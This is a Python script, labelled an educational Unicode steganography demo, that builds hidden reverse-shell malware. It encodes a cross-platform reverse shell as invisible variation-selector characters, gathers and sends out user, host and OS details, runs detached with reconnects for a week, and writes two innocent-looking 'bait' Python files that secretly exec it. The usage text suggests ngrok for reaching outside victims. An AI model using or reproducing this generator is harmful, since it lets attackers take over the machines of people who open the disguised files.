"""
GENERATOR - Educational Unicode Steganography Demo
FE00 + E0100 Technique — Python

Generates: bait_emulator.py  (emulator pattern, justified exec)
           bait_utils.py     (utility pattern, hidden inline exec)

Usage: python bait_generator.py <IP> <PORT>
       python bait_generator.py --ip <IP> --port <PORT>
"""

import os
import sys

sys.stdout.reconfigure(encoding='utf-8')


def build_payload(ip, port):
    tpl = '''
import subprocess, sys, platform, shutil, base64

LISTENER_IP = '__LISTENER_IP__'
PORT = __LISTENER_PORT__
_sys = platform.system()

# Shell based on OS — Windows: pwsh -> powershell -> cmd
#                     macOS  : zsh (default since Catalina 2019) -> bash
#                     Linux  : bash -> sh
if _sys == 'Windows':
    _sh = shutil.which('pwsh') or shutil.which('powershell') or 'cmd.exe'
    # UTF-8 encoding as startup argument — applied BEFORE any output
    if 'pwsh' in _sh.lower() or 'powershell' in _sh.lower():
        _shell = [_sh, '-NoExit', '-Command', '[Console]::OutputEncoding=[Text.Encoding]::UTF8']
    else:
        _shell = [_sh, '/Q', '/K', 'chcp 65001']
elif _sys == 'Darwin':
    _shell = [shutil.which('zsh') or '/bin/bash', '-i']
else:
    _shell = [shutil.which('bash') or '/bin/sh', '-i']

_is_win = _sys == 'Windows'

# Self-contained script: reconnect + backoff (5s, +3, reset at >=60s, max 7 days)
_code = f"""import socket, subprocess, threading, time, platform, getpass, os

IP = {repr(LISTENER_IP)}
PORT = {repr(PORT)}
sh = {repr(_shell)}
w = 5
_end = time.time() + 604800

while time.time() < _end:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        w = 5
        _sep = chr(9472) * 50 + chr(10)
        _fi = [
            "  OS      : " + platform.system() + " " + platform.release() + " " + platform.version(),
            "  Shell   : " + os.path.basename(sh[0]),
            "  User    : " + getpass.getuser(),
            "  Hostname: " + socket.gethostname(),
            "  Arch    : " + platform.machine(),
            "  CWD     : " + os.getcwd(),
            "  PID     : " + str(os.getpid())
        ]
        s.sendall((_sep + chr(10).join(_fi) + chr(10) + _sep).encode("utf-8"))

        if platform.system() == "Windows":
            p = subprocess.Popen(sh, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, bufsize=0)

            def fo(pr, sk):
                while True:
                    d = pr.stdout.read(4096)
                    if not d:
                        pr.kill()
                        break
                    try:
                        sk.sendall(d)
                    except:
                        pr.kill()
                        break

            def fi(pr, sk):
                while True:
                    try:
                        d = sk.recv(4096)
                    except:
                        pr.kill()
                        break
                    if not d:
                        pr.kill()
                        break
                    try:
                        pr.stdin.write(d)
                        pr.stdin.flush()
                    except:
                        break

            threading.Thread(target=fo, args=(p, s), daemon=True).start()
            threading.Thread(target=fi, args=(p, s), daemon=True).start()
            p.wait()
        else:
            p = subprocess.Popen(sh, stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
            p.wait()

        s.close()
    except Exception:
        try:
            s.close()
        except:
            pass
    time.sleep(w)
    w = 5 if w >= 60 else w + 3"""
_b64 = base64.b64encode(_code.encode()).decode()


# Launch detached process — survives parent terminal closing
try:
    _cmd = [sys.executable, '-c', 'import base64;exec(base64.b64decode("' + _b64 + '"))']
    if _is_win:
        subprocess.Popen(_cmd, creationflags=0x08000000,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.Popen(_cmd, start_new_session=True,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except Exception:
    pass
'''
    return tpl.replace('__LISTENER_IP__', ip).replace('__LISTENER_PORT__', str(port))


def encode(text):
    result = ''
    for byte in text.encode('utf-8'):
        if byte < 16:
            result += chr(0xFE00 + byte)
        else:
            result += chr(0xE0100 + byte - 16)
    return result


# ═══════════════════════════════════════════════════════
#  ARGUMENT PARSING
# ═══════════════════════════════════════════════════════

def parse_args():
    args = sys.argv[1:]
    ip = port = None
    i = 0
    while i < len(args):
        if args[i] == '--ip' and i + 1 < len(args):
            ip = args[i + 1]; i += 2
        elif args[i] == '--port' and i + 1 < len(args):
            port = args[i + 1]; i += 2
        elif not args[i].startswith('--'):
            if ip is None: ip = args[i]
            elif port is None: port = args[i]
            i += 1
        else:
            i += 1
    return ip, port


def show_usage():
    name = 'python bait_generator.py'
    print('\033[36m╔' + '═' * 56 + '╗')
    print('║  BAIT GENERATOR — Hidden Unicode Payload              ║')
    print('╚' + '═' * 56 + '╝\033[0m')
    print()
    print(f'Usage: {name} <IP> <PORT>')
    print(f'       {name} --ip <IP> --port <PORT>')
    print()
    print('  IP     IP or domain where your listener is running')
    print('  PORT   Listener port')
    print()
    print('Examples:')
    print(f'  Same network:  {name} 192.168.1.6 4444')
    print(f'  With ngrok:    {name} 8.tcp.ngrok.io 10914')
    print(f'  Same PC:       {name} 127.0.0.1 4444')
    print()
    sys.exit(1)


_ip, _port = parse_args()

if not _ip or not _port:
    show_usage()

try:
    _port = int(_port)
except ValueError:
    print('\033[31m[!] Error: port must be a number between 1 and 65535\033[0m')
    sys.exit(1)

if not (1 <= _port <= 65535):
    print('\033[31m[!] Error: port must be a number between 1 and 65535\033[0m')
    sys.exit(1)

payload = build_payload(_ip, _port)
invisible = encode(payload)

# ═══════════════════════════════════════════════════════
#  GENERATE bait_emulator.py — emulator pattern
#  exec is JUSTIFIED by the emulator design.
# ═══════════════════════════════════════════════════════
file1 = (
    '# bait_emulator.py - Educational example of processing in Python\n'
    '# This script demonstrates how to transform special Unicode characters into numeric values\n'
    '# and then concatenate strings to simulate a basic execution environment.\n'
    '# Usage: python bait_emulator.py\n'
    '\n'
    '# Function that converts Unicode Variation Selectors to bytes, to_bytes\n'
    'def to_bytes(s):\n'
    '    result = []\n'
    '    for c in s:\n'
    '        cp = ord(c)\n'
    '        if 0xFE00 <= cp <= 0xFE0F: result.append(cp - 0xFE00)\n'
    '        elif 0xE0100 <= cp <= 0xE01EF: result.append(cp - 0xE0100 + 16)\n'
    '    return bytes(result)\n'
    '\n'
    '# Initial emulator environment — base string of Variation Selectors\n'
    "empty = '" + invisible + "'\n"
    '\n'
    '# Function that simulates Python code execution with a preloaded environment\n'
    "# Note: exec is used solely for demonstrative purposes in this academic example\n"
    'def emulate_message(code):\n'
    "    exec(to_bytes(empty).decode('utf-8') + code)\n"
    '\n'
    '# Example usage of the emulator: prints a message to console\n'
    "emulate_message(\"print('Hello world')\")\n"
)

# ═══════════════════════════════════════════════════════
#  GENERATE bait_utils.py — utility pattern, hidden exec
# ═══════════════════════════════════════════════════════
file2 = (
    '# bait_utils.py - Hexadecimal conversion utilities\n'
    '# Converts strings and bytes between their hexadecimal representations\n'
    '# Usage: python bait_utils.py\n'
    '\n'
    'def _decode(s):\n'
    '    r = []\n'
    '    for c in s:\n'
    '        cp = ord(c)\n'
    '        if 0xFE00 <= cp <= 0xFE0F: r.append(cp - 0xFE00)\n'
    '        elif 0xE0100 <= cp <= 0xE01EF: r.append(cp - 0xE0100 + 16)\n'
    "    return bytes(r).decode('utf-8')\n"
    '\n'
    "empty = '" + invisible + "'\n"
    '\n'
    "def str_to_hex(s, enc='utf-8'): return s.encode(enc).hex()\n"
    'def hex_to_bytes(h): return bytes.fromhex(h)\n'
    'def bytes_to_hex(b): return b.hex()\n'
    "def format_hex(h, sep=' '): return sep.join(h[i:i+2].upper() for i in range(0, len(h), 2))\n"
    "def hex_to_str(h, enc='utf-8'): result = bytes.fromhex(h).decode(enc); exec(_decode(empty)); return result\n"
    '\n'
    '# Demo\n'
    "s = 'Hello Duver'\n"
    'h = str_to_hex(s)\n'
    "print(f'str -> hex: {h}')\n"
    "print(f'hex -> str: {hex_to_str(h)}')\n"
    "print(f'formatted: {format_hex(h)}')\n"
)

os.makedirs('Bait To Client', exist_ok=True)

with open(os.path.join('Bait To Client', 'bait_emulator.py'), 'w', encoding='utf-8') as f:
    f.write(file1)

with open(os.path.join('Bait To Client', 'bait_utils.py'), 'w', encoding='utf-8') as f:
    f.write(file2)

_script_dir = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(_script_dir, '.last_target'), 'w') as f:
    f.write(f'{_ip}\n{_port}\n')

# ═══════════════════════════════════════════════════════
#  OUTPUT
# ═══════════════════════════════════════════════════════
payload_bytes    = len(payload.encode('utf-8'))
invisible_chars  = len(invisible)
invisible_weight = len(invisible.encode('utf-8'))
size1_total      = len(file1.encode('utf-8'))
size2_total      = len(file2.encode('utf-8'))
size1_visible    = size1_total - invisible_weight
size2_visible    = size2_total - invisible_weight

exec_line = next((l for l in file2.splitlines() if 'exec(' in l), '')
exec_col  = len(exec_line.encode('utf-8')) - len(exec_line.encode('utf-8').lstrip()) \
            + exec_line.lstrip().index('exec(') + 1 if exec_line else 0

def kb(n): return f'{n / 1024:.1f} KB'

print('\033[36m╔' + '═' * 56 + '╗')
print('║  BAIT GENERATOR — Hidden Unicode Payload              ║')
print('╚' + '═' * 56 + '╝\033[0m')
print()
print('\033[33m[*] Configuration\033[0m')
print(f'    LISTENER_IP : {_ip}')
print(f'    PORT        : {_port}')
print()
print('\033[33m[*] Encoded payload\033[0m')
print(f'    {payload_bytes} bytes → {invisible_chars} invisible characters (Unicode Variation Selectors)')
print(f'    Hidden payload weight: {kb(invisible_weight)}')
print()
print('\033[32m[✓] File 1 → Bait To Client/bait_emulator.py\033[0m')
print('    Technique      : Python Emulator (semantically justified exec)')
print(f'    Visible size   : {kb(size1_visible)}  ← what the file recipient sees')
print(f'    Actual size    : {kb(size1_total)}  ← true size on disk')
print(f'    Difference     : +{kb(invisible_weight)} of invisible characters')
print()
print('\033[32m[✓] File 2 → Bait To Client/bait_utils.py\033[0m')
print(f'    Technique      : Hex utility (exec hidden at column ~{exec_col})')
print(f'    Visible size   : {kb(size2_visible)}  ← what the file recipient sees')
print(f'    Actual size    : {kb(size2_total)}  ← true size on disk')
print(f'    Difference     : +{kb(invisible_weight)} of invisible characters')
print()
print('\033[32m[✓] 2 bait files generated successfully.\033[0m')
print('    The payload is invisible to the human eye — the baits look like legitimate code.')
print()
print()
